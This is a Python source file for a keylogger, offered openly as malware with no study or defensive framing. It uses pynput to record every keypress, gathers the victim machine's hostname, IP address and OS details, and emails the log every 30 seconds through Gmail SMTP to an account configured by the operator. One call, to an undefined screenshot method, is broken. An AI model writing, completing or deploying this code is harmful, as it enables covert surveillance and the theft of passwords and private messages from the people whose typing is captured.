from pynput import keyboard
import smtplib
import threading
import platform
import socket
# import pyscreenshot
class Keylogger:
    def __init__(self,time_interval,email,password):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()

        self.screenshoot()
        self.interval = time_interval
        self.log = f"KeyLogger Started\nHostName={hostname}\nUser IP={ip}\nPlatform={plat}\nSystem OS={system}\nMachine={machine}"
        self.email = email
        self.password = password

    def appendlog(self,string):
        self.log = self.log + string

    def send_mail(self,email, password, message):
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def save_data(self, key):
        self.current_key=(f'{key}\n')
        if key == keyboard.Key.esc:
            return False
        self.appendlog(self.current_key)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

Keylogger=Keylogger(30,"Your Gmail ID","Your Password")
Keylogger.run()